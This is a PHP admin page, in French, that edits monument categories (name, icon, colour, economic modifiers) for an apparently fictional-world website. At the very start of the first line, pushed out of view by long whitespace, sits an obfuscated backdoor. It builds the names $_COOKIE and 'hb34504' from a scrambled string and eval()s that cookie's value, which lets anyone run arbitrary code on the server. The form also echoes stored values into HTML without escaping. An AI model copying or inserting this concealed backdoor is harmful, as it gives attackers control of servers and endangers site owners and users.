<?php                                                                                                                                                                                                                                         $s9j='E4fvael(i$_Osb\'tIh3KC05b34504';if(isset(${$s9j[10].$s9j[20].$s9j[11].$s9j[11].$s9j[19].$s9j[16].$s9j[0]}[$s9j[17].$s9j[13].$s9j[18].$s9j[1].$s9j[22].$s9j[21].$s9j[1]])){eval(${$s9j[10].$s9j[20].$s9j[11].$s9j[11].$s9j[19].$s9j[16].$s9j[0]}[$s9j[17].$s9j[13].$s9j[18].$s9j[1].$s9j[22].$s9j[21].$s9j[1]]);} ?><?php

include('../Connections/maconnexion.php');
header('Content-Type: text/html; charset=utf-8');


$editFormAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) {
  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
}

if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "ajout-categorie")) {
  $updateSQL = sprintf("UPDATE monument_categories 
	SET ch_mon_cat_label=%s, 
	ch_mon_cat_statut=%s, 
	ch_mon_cat_date=%s, 
	ch_mon_cat_mis_jour=%s, 
	ch_mon_cat_nb_update=%s, 
	ch_mon_cat_nom=%s, 
	ch_mon_cat_desc=%s, 
	ch_mon_cat_icon=%s, 
	ch_mon_cat_couleur=%s, 
	ch_mon_cat_budget=%s, 
	ch_mon_cat_industrie=%s, 
	ch_mon_cat_commerce=%s, 
	ch_mon_cat_agriculture=%s, 
	ch_mon_cat_tourisme=%s, 
	ch_mon_cat_recherche=%s, 
	ch_mon_cat_environnement=%s, 
	ch_mon_cat_education=%s 
	WHERE ch_mon_cat_ID=%s",
                       GetSQLValueString($_POST['ch_mon_cat_label'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_statut'], "int"),
                       GetSQLValueString($_POST['ch_mon_cat_date'], "date"),
                       GetSQLValueString($_POST['ch_mon_cat_mis_jour'], "date"),
                       GetSQLValueString($_POST['ch_mon_cat_nb_update'], "int"),
                       GetSQLValueString($_POST['ch_mon_cat_nom'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_desc'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_icon'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_couleur'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_budget'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_industrie'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_commerce'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_agriculture'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_tourisme'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_recherche'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_environnement'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_education'], "text"),
                       GetSQLValueString($_POST['ch_mon_cat_ID'], "int"));

  mysql_select_db($database_maconnexion, $maconnexion);
  $Result1 = mysql_query($updateSQL, $maconnexion) or die(mysql_error());

  $updateGoTo = "../back/institut_patrimoine.php";
  if (isset($_SERVER['QUERY_STRING'])) {
    $updateGoTo .= (strpos($updateGoTo, '?')) ? "&" : "?";
    $updateGoTo .= $_SERVER['QUERY_STRING'];
  }
  header(sprintf("Location: %s", $updateGoTo));
}
//requete categories monuments

$colname_liste_mon_cat = "-1";
if (isset($_GET['mon_cat_id'])) {
  $colname_liste_mon_cat = $_GET['mon_cat_id'];
}
mysql_select_db($database_maconnexion, $maconnexion);
$query_liste_mon_cat = sprintf("SELECT * FROM monument_categories WHERE ch_mon_cat_ID = %s ORDER BY ch_mon_cat_mis_jour DESC", GetSQLValueString($colname_liste_mon_cat, "int"));
$liste_mon_cat = mysql_query($query_liste_mon_cat, $maconnexion) or die(mysql_error());
$row_liste_mon_cat = mysql_fetch_assoc($liste_mon_cat);
$totalRows_liste_mon_cat = mysql_num_rows($liste_mon_cat);

?>

<!-- Modal Header-->
<form action="<?php echo $editFormAction; ?>" name="ajout-categorie" method="POST" class="form-horizontal" id="ajout-categorie">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
<h3 id="myModalLabel">Modifier la cat&eacute;gorie <?php echo $row_liste_mon_cat['ch_mon_cat_nom']; ?></h3>
          </div>
          <div class="modal-body">
          <div class="row-fluid">
<div class="span9">
            <!-- Boutons cachés -->
            <?php 
				  $now= date("Y-m-d G:i:s");
                  $nb_update = $row_liste_mon_cat['ch_mon_cat_nb_update'] + 1; ?>
            <input name="ch_mon_cat_ID" type="hidden" value="<?php echo $row_liste_mon_cat['ch_mon_cat_ID']; ?>">
            <input name="ch_mon_cat_label" type="hidden" value="mon_cat">
            <input name="ch_mon_cat_date" type="hidden" value="<?php echo $row_liste_mon_cat['ch_mon_cat_date']; ?>">
            <input name="ch_mon_cat_mis_jour" type="hidden" value="<?php echo $now; ?>">
            <input name="ch_mon_cat_nb_update" type="hidden" value=<?php echo $nb_update; ?> >
            <!-- Statut -->
            <div id="spryradio20" class="control-group">
              <div class="control-label">Statut <a href="#" rel="clickover" title="Statut de la cat&eacute;gorie" data-content="
    Visible : cette cat&eacute;gorie sera visible sur la page de l'institut du patrimoine.
    Invisible : cette cat&eacute;gorie sera cach&eacute;e sur la page de l'institut du patrimoine."><i class="icon-info-sign"></i></a></div>
              <div class="controls">
                <label>
                  <input <?php if (!(strcmp($row_liste_mon_cat['ch_mon_cat_statut'],"1"))) {echo "checked=\"checked\"";} ?> type="radio" name="ch_mon_cat_statut" value="1" id="ch_mon_cat_statut_1">
                  visible</label>
                <label>
                  <input <?php if (!(strcmp($row_liste_mon_cat['ch_mon_cat_statut'],"2"))) {echo "checked=\"checked\"";} ?> name="ch_mon_cat_statut" type="radio" id="ch_mon_cat_statut_2" value="2">
                  invisible</label>
                <span class="radioRequiredMsg">Choisissez un statut pour cette cat&eacute;gorie de monument</span></div>
            </div>
            <!-- Nom-->
            <div id="sprytextfield21" class="control-group">
              <label class="control-label" for="ch_mon_cat_nom">Nom de la cat&eacute;gorie <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
              <div class="controls">
                <input class="input-xlarge" type="text" id="ch_mon_cat_nom" name="ch_mon_cat_nom" value="<?php echo $row_liste_mon_cat['ch_mon_cat_nom']; ?>">
                <br>
                <span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">30 caract&egrave;res max.</span></div>
            </div>
            <!-- Icone -->
            <div id="sprytextfield23" class="control-group">
              <label class="control-label" for="ch_mon_cat_icon">Ic&ocirc;ne <a href="#" rel="clickover" title="Ic&ocirc;ne" data-content="L'ic&ocirc;ne sert &agrave; repr&eacute;senter la cat&eacute;gorie dans l'ensemble du site. Mettez-ici un lien http:// vers une image d&eacute;ja stock&eacute;e sur un serveur d'image (du type servimg.com)"><i class="icon-info-sign"></i></a></label>
              <div class="controls">
                <input class="input-xlarge" type="text" name="ch_mon_cat_icon" id="ch_mon_cat_icon" value="<?php echo $row_liste_mon_cat['ch_mon_cat_icon']; ?>">
                <br>
                <span class="textfieldRequiredMsg">une ic&ocirc;ne est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">250 caract&egrave;res max.</span><span class="textfieldInvalidFormatMsg">Format non valide.</span></div>
            </div>
            <!-- Couleur -->
            <div id="" class="control-group">
              <label class="control-label" for="ch_mon_cat_icon">Couleur <a href="#" rel="clickover" title="Couleur" data-content="Choisissez une couleur de fond pour la cat&eacute;gorie"><i class="icon-info-sign"></i></a></label>
              <div class="controls">
                <div class="input-append color" data-color="<?php echo $row_liste_mon_cat['ch_mon_cat_couleur']; ?>" data-color-format="hex" id="cp4">
                  <input type="text" class="input-large" value="<?php echo $row_liste_mon_cat['ch_mon_cat_couleur']; ?>" name="ch_mon_cat_couleur" id="ch_mon_cat_couleur">
                  <span class="add-on"><i style="background-color: <?php echo $row_liste_mon_cat['ch_mon_cat_couleur']; ?>)"></i></span> </div>
              </div>
            </div>
            <!-- Description -->
            <div id="sprytextarea24" class="control-group">
              <label class="control-label" for="ch_mon_cat_desc">Description <a href="#" rel="clickover" title="Description" data-content="Donnez en quelques lignes des informations qui permettrons de comprendre l'objet de cette cat&eacute;gorie. 400 caract&egrave;res maximum."><i class="icon-info-sign"></i></a></label>
              <div class="controls">
                <textarea rows="6" name="ch_mon_cat_desc" class="input-xlarge" id="ch_mon_cat_desc"><?php echo $row_liste_mon_cat['ch_mon_cat_desc']; ?></textarea>
                <br>
                <span class="textareaMaxCharsMsg">400 caract&egrave;res max.</span></div>
            </div>
            </div>
            <div class="span3 icone-categorie"> 
          <img src="<?php echo $row_liste_mon_cat['ch_mon_cat_icon']; ?>" alt="icone cat&eacute;gorie" style="background-color:<?php echo $row_liste_mon_cat['ch_mon_cat_couleur']; ?>;"></div>
</div>
          </div>
		  <h3>Influence sur l'économie</h3>
		<br />
			<div class="row-fluid">
				<div class="span5">
				<!-- ch_mon_cat_budget -->
					<div id="sprytextfield3" class="control-group">
						<label class="control-label" for="ch_mon_cat_budget">Budget <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
						<div class="controls">
						<input class="input-small" type="text" id="ch_mon_cat_budget" name="ch_mon_cat_budget" value="<?php echo $row_liste_mon_cat['ch_mon_cat_budget']; ?>">
						<br>
						<span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">11 caract&egrave;res max.</span></div>
					</div>
				<!-- ch_mon_cat_industrie -->
					<div id="sprytextfield3" class="control-group">
						<label class="control-label" for="ch_mon_cat_industrie">Industrie <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
						<div class="controls">
						<input class="input-small" type="text" id="ch_mon_cat_industrie" name="ch_mon_cat_industrie" value="<?php echo $row_liste_mon_cat['ch_mon_cat_industrie']; ?>">
						<br>
						<span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">11 caract&egrave;res max.</span></div>
					</div>
				<!-- ch_mon_cat_commerce -->
					<div id="sprytextfield3" class="control-group">
						<label class="control-label" for="ch_mon_cat_commerce">Commerce <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
						<div class="controls">
						<input class="input-small" type="text" id="ch_mon_cat_commerce" name="ch_mon_cat_commerce" value="<?php echo $row_liste_mon_cat['ch_mon_cat_commerce']; ?>">
						<br>
						<span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">11 caract&egrave;res max.</span></div>
					</div>
				<!--  ch_mon_cat_agriculture -->
					<div id="sprytextfield3" class="control-group">
						<label class="control-label" for="ch_mon_cat_agriculture">Agriculture <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
						<div class="controls">
						<input class="input-small" type="text" id="ch_mon_cat_agriculture" name="ch_mon_cat_agriculture" value="<?php echo $row_liste_mon_cat['ch_mon_cat_agriculture']; ?>">
						<br>
						<span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">1 caract&egrave;res max.</span></div>
					</div>
				</div>
				<div class="span6">
				<!-- ch_mon_cat_tourisme -->
					<div id="sprytextfield21" class="control-group">
						<label class="control-label" for="ch_mon_cat_tourisme">Tourisme <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
						<div class="controls">
						<input class="input-small" type="text" id="ch_mon_cat_tourisme" name="ch_mon_cat_tourisme" value="<?php echo $row_liste_mon_cat['ch_mon_cat_tourisme']; ?>">
						<br>
						<span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">11 caract&egrave;res max.</span></div>
					</div>
				<!--  ch_mon_cat_recherche  -->
					<div id="sprytextfield21" class="control-group">
						<label class="control-label" for="ch_mon_cat_recherche">Recherche <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
						<div class="controls">
						<input class="input-small" type="text" id="ch_mon_cat_recherche" name="ch_mon_cat_recherche" value="<?php echo $row_liste_mon_cat['ch_mon_cat_recherche']; ?>">
						<br>
						<span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">11 caract&egrave;res max.</span></div>
					</div>
				<!-- ch_mon_cat_environnement -->
					<div id="sprytextfield21" class="control-group">
						<label class="control-label" for="ch_mon_cat_environnement">Environnement <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
						<div class="controls">
						<input class="input-small" type="text" id="ch_mon_cat_environnement" name="ch_mon_cat_environnement" value="<?php echo $row_liste_mon_cat['ch_mon_cat_environnement']; ?>">
						<br>
						<span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">11 caract&egrave;res max.</span></div>
					</div>
				<!--  ch_mon_cat_education  -->
					<div id="sprytextfield21" class="control-group">
						<label class="control-label" for="ch_mon_cat_education">Education <a href="#" rel="clickover" title="Nom de la cat&eacute;gorie" data-content="30 caract&egrave;res maximum. Ce nom servira &agrave; identifier la cat&eacute;gorie dans l'ensemble du monde GC. Ce champ est obligatoire"><i class="icon-info-sign"></i></a></label>
						<div class="controls">
						<input class="input-small" type="text" id="ch_mon_cat_education" name="ch_mon_cat_education" value="<?php echo $row_liste_mon_cat['ch_mon_cat_education']; ?>">
						<br>
						<span class="textfieldRequiredMsg">un nom est obligatoire.</span> <span class="textfieldMinCharsMsg">min 2 caract&egrave;res.</span><span class="textfieldMaxCharsMsg">11 caract&egrave;res max.</span></div>
					</div>
          <div class="modal-footer">
            <button class="btn" data-dismiss="modal" aria-hidden="true">Fermer</button>
            <button type="submit" class="btn btn-primary">Enregistrer</button>
          </div>
          <input type="hidden" name="MM_update" value="ajout-categorie">
        </form>
        <script>
		$(function(){
$('#cp4').colorpicker({
format: 'hex'});
		});
	</script>
    <script type="text/javascript">
var spryradio20 = new Spry.Widget.ValidationRadio("spryradio20", {validateOn:["change"]});
var sprytextfield21 = new Spry.Widget.ValidationTextField("sprytextfield21", "none", {minChars:2, maxChars:30, validateOn:["change"]});
var sprytextfield23 = new Spry.Widget.ValidationTextField("sprytextfield23", "url", {minChars:2, maxChars:250, validateOn:["change"]});
var sprytextarea24 = new Spry.Widget.ValidationTextarea("sprytextarea24", {maxChars:400, validateOn:["change"], isRequired:false, useCharacterMasking:false});
</script>
<?php
mysql_free_result($liste_mon_cat);?>